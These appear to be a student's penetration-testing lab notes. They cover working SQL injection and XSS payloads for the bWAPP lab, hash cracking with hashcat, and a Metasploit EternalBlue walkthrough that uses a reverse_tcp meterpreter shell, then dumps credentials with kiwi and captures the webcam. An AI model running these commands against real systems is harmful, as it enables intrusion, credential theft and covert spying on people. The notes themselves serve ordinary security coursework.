# C part questions(13 points)
Another parts [part A](part2.md) [part B](part3.md)
 ## Download index page of cisco.com, extract unique dns to which the page redirects you
 1. Download the index page 
 ```
 kali@kali:~# wget www.cisco.com
 ```
 2. Use this command to get domains
 ```
 kali@kali:~# grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u
 ```
 3. Get ip addresses (maybe optional)
 ```
 kali@kali:~# for url in $(cat list.txt); do host $url; done
 ```
 
 ### Explanation
 1. Extract all the links with `grep "href=" index.html`
 2. Get mostly the links with "/" delimeter `cut -d "/" -f 3`
 3. Get only domains with `grep "\."`
 4. Clean up the above step with `cut -d '"' -f 1`
 5. Sort results with `sort -u`
 
 
 ## Show 3 working OWASP in bWAPP
 1. sqli_2.php
 ```
 localhost/bWAPP/sqli_2.php?movie=-1+union+select+1,login,password,secret,email,6,7+from+bWAPP.users+order%20by%204+desc+&action=go
 ```
 2. xss_stored_1.php
 ```
 <script>alert(1);</script>
 ```
 3. xss_stored_3.php
   1. Find `input` in code inspector and change **type** from `hidden` to `text`
   2. Enter any value to first `input` and enter your script to second `input`
   ```
   "><script>alert(1);</script>
   ```
 4. htmli_get.php
 ```
 <script>alert(document.cookie);</script>
 ```
 
 ## Hash: 1st indentify which hash, then break given hash
 ### How can I identify hash type
 ```
 hashid [hash]
 ```
 it will give answers like
 ```
kali@kali:~$ hashid 7815696ECBF1C96E6894B779456D330E
Analyzing '7815696ECBF1C96E6894B779456D330E'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 

 ```
 - There is no concrete method for identifying a hash algorithm using the hash alone.

 - Some hashes have signatures which give a strong indication of which algorithm was used, such as “$1$” for md5crypt. Usually you can rely on this information; however, this method of identification is not bullet-proof! For example, consider an algorithm such as crypt(sha256(pass), “$1$”).

- For hashes which have no signature, it is virtually impossible to distinguish which algorithm was used. A string of 32 hex characters could be LM, NTLM, MD4, MD5, double MD5, triple md5, md5(sha512(pass)), so on and so forth. There is literally an infinite number of possibilities for what the algorithm may be!

- Tools which claim to be able to identify hashes simply use regular expressions to match the hash against common patterns. This method is extremely unreliable and often yields incorrect results. It is best to avoid using such tools.

- A much better way to identify the hash algorithm would be to understand the origin of the hashes (e.g. operating system, COTS application, web application, etc.) and make an educated guess at what the hash algorithm might be. Or better yet, use the source!

- For some example hashes see the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) wiki page.

### Breaking the hash
[hashcat wiki](https://hashcat.net/wiki/doku.php?id=hashcat)
```
hashcat -m [hash type] -a [attack mode] [hash itself] --force
```
- Example breaking md5 of `hello` with brute-force
```
hashcat -m 0 -a 3 5d41402abc4b2a76b9719d911017c592 --force
```
 ## msfconsole: setup everything and run exploit
 1. using `nmap` or `armitage` find ip of device
 2. find if there is smb service
 ```
 nmap -v [ip address] -Pn -A -T5
 ```
 3. run Metasploit
 ```
 sudo msfconsole
 ```
 4. Follow these commands
    1. `use exploit/windows/smb/ms17_010_eternalblue`
    2. `set rhosts [target ip]`
    3. `set payload windows/x64/meterpreter/reverse_tcp`
    4. `set lhost [own ip]`
    5. `set ForceExploit true`
    6. `exploit`
5. If exploit was **successful**
   1. **get passwords**
      1. `load kiwi`
      2. `getprivs`
      3. `creds all`
   2. **take screenshot**
      1. `screenshot`
   3. **capture webcam**
      1. `webcam_list` (check if there is any webcam)
      2. `webcam_snap` (take a photo from webcam)
      3. `webcam_stream` (to stream a video from a webcam)
